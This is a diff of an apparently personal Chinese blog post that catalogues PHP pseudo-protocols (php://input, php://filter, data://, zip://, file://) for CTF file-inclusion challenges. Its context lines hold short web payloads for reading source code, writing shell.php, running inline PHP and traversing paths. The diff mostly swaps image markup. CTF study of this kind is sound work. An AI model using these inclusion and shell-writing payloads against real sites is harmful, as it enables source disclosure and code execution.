@@ -13,8 +13,16 @@
 <meta property="og:site_name" content="Rj45&#39;s blog">
 <meta property="og:description" content="一、前言：经常遇到php伪协议,特别是CTF比赛，还有一些线下的比赛,这里我系统的总结一下。 二、概念：php伪协议一共有12种。 伪协议|描述:–:|:–:|–file:&#x2F;&#x2F;|访问本地文件系统http:&#x2F;&#x2F;|访问http(s)网址ftp:&#x2F;&#x2F;|访问ftp(s)urlsphp:&#x2F;&#x2F;|访问各个输入输出流zlib:&#x2F;&#x2F;|压缩包data:&#x2F;&#x2F;|数据glob:&#x2F;&#x2F;|查找匹配的文件路径模式phar:&#x2F;&#x2F;|p">
 <meta property="og:locale" content="en">
-<meta property="og:updated_time" content="2019-03-03T15:58:21.217Z">
+<meta property="og:image" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;php-%E4%BC%AA%E5%8D%8F%E8%AE%AE&#x2F;1.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;php-%E4%BC%AA%E5%8D%8F%E8%AE%AE&#x2F;3.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;php-%E4%BC%AA%E5%8D%8F%E8%AE%AE&#x2F;4.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;php-%E4%BC%AA%E5%8D%8F%E8%AE%AE&#x2F;5.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;php-%E4%BC%AA%E5%8D%8F%E8%AE%AE&#x2F;2.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;php-%E4%BC%AA%E5%8D%8F%E8%AE%AE&#x2F;6.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;php-%E4%BC%AA%E5%8D%8F%E8%AE%AE&#x2F;7.png">
+<meta property="og:updated_time" content="2019-12-14T06:51:58.406Z">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;php-%E4%BC%AA%E5%8D%8F%E8%AE%AE&#x2F;1.png">
     
     
         
@@ -155,12 +163,12 @@
 <h2 id="2、php-input"><a href="#2、php-input" class="headerlink" title="2、php://input"></a>2、php://input</h2><p>php://output 是一个只写的数据流， 允许你以 print 和 echo 一样的方式 写入到输出缓冲区。</p>
 <h2 id="3、php-fd"><a href="#3、php-fd" class="headerlink" title="3、php://fd"></a>3、php://fd</h2><p>php://fd</p>
 <h2 id="4、php-memory和php-temp"><a href="#4、php-memory和php-temp" class="headerlink" title="4、php://memory和php://temp"></a>4、php://memory和php://temp</h2><p>php://memory 和 php://temp 是一个类似文件 包装器的数据流，允许读写临时数据。 两者的唯一区别是 php://memory 总是把数据储存在内存中， 而 php://temp 会在内存量达到预定义的限制后（默认是 2MB）存入临时文件中。 临时文件位置的决定和 sys_get_temp_dir() 的方式一致。<br>php://temp 的内存限制可通过添加 /maxmemory:NN 来控制，NN 是以字节为单位、保留在内存的最大数据量，超过则使用临时文件。</p>
-<h2 id="5、php-input"><a href="#5、php-input" class="headerlink" title="5、php://input"></a>5、php://input</h2><p>1)访问只读流<br>php://input 是个可以访问请求的原始数据的只读流。因为它不依赖于特定的 php.ini 指令。<br>![](php 伪协议/1.png)</p>
+<h2 id="5、php-input"><a href="#5、php-input" class="headerlink" title="5、php://input"></a>5、php://input</h2><p>1)访问只读流<br>php://input 是个可以访问请求的原始数据的只读流。因为它不依赖于特定的 php.ini 指令。<br><img src="/php-%E4%BC%AA%E5%8D%8F%E8%AE%AE/1.png" alt></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=class.php&amp;pass=&amp;user=php://input</span><br></pre></td></tr></table></figure>
-<p>注：enctype=”multipart/form-data” 的时候 php://input 是无效的。<br>2)获取路径：<br>![](php 伪协议/3.png)<br>3)查看phpinfo()<br>![](php 伪协议/4.png)<br>4)写入shell<br>![](php 伪协议/5.png)</p>
+<p>注：enctype=”multipart/form-data” 的时候 php://input 是无效的。<br>2)获取路径：<br><img src="/php-%E4%BC%AA%E5%8D%8F%E8%AE%AE/3.png" alt><br>3)查看phpinfo()<br><img src="/php-%E4%BC%AA%E5%8D%8F%E8%AE%AE/4.png" alt><br>4)写入shell<br><img src="/php-%E4%BC%AA%E5%8D%8F%E8%AE%AE/5.png" alt></p>
 <h2 id="6、php-filter"><a href="#6、php-filter" class="headerlink" title="6、php://filter"></a>6、php://filter</h2><p>(1)查看源码</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file=php://filter/read=convert.base64-encode/resource=class.php</span><br><span class="line">//file=php://filter/read=string.rot13/resource=class.php</span><br><span class="line">//file=php://filter/read=string.toupper|string.rot13/resource=class.php</span><br></pre></td></tr></table></figure>
-<p>1)加密解密<br>convert.base64-encode &amp; convert.base64-decode<br>2)其他转换<br>string.rot13<br>进行rot13转换 string.toupper<br>将字符全部大写 string.tolower<br>将字符全部小写 string.strip_tags<br>![](php 伪协议/2.png)<br>(2)写入代码</p>
+<p>1)加密解密<br>convert.base64-encode &amp; convert.base64-decode<br>2)其他转换<br>string.rot13<br>进行rot13转换 string.toupper<br>将字符全部大写 string.tolower<br>将字符全部小写 string.strip_tags<br><img src="/php-%E4%BC%AA%E5%8D%8F%E8%AE%AE/2.png" alt><br>(2)写入代码</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/write=convert.base64-decode/resource=shell.php</span><br></pre></td></tr></table></figure>
 <h2 id="7、zip-bzip2-zlib"><a href="#7、zip-bzip2-zlib" class="headerlink" title="7、zip://,bzip2://,zlib://"></a>7、zip://,bzip2://,zlib://</h2><p>直接访问压缩包里的文件。<br>1)zip://</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zip://绝对路径+文件.zip</span><br></pre></td></tr></table></figure>
@@ -173,9 +181,9 @@
 <p>或者,zip:// [压缩文件绝对路径]#[压缩文件内的子文件名],compress.zlib://</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=compress.zlib://C:/phpStudy/PHPTutorial/WWW/lsawebtest/phptest/phpinfo.txt.gz</span><br></pre></td></tr></table></figure>
 <p>改后缀为jpg亦可，相对路径亦可。</p>
-<h2 id="8、data"><a href="#8、data" class="headerlink" title="8、data://"></a>8、data://</h2><p>data:text//plain<br>![](php 伪协议/6.png)</p>
+<h2 id="8、data"><a href="#8、data" class="headerlink" title="8、data://"></a>8、data://</h2><p>data:text//plain<br><img src="/php-%E4%BC%AA%E5%8D%8F%E8%AE%AE/6.png" alt></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file=data:text//plain,&lt;?php phpinfo();?&gt;</span><br><span class="line">file=data:text//plain;base64,PD9waHAgcGhwaW5mbygpPz4=</span><br></pre></td></tr></table></figure>
-<p>![](php 伪协议/7.png)</p>
+<p><img src="/php-%E4%BC%AA%E5%8D%8F%E8%AE%AE/7.png" alt></p>
 <h2 id="9、file"><a href="#9、file" class="headerlink" title="9、file://"></a>9、file://</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page = file://../../../../flag.txt</span><br></pre></td></tr></table></figure>
 <h2 id="10、ftp"><a href="#10、ftp" class="headerlink" title="10、ftp://"></a>10、ftp://</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page = ftp://+ip+文件</span><br></pre></td></tr></table></figure>
 <h1 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h1><p>php://filter/read=convert.base64-encode/resource=class.php</p>
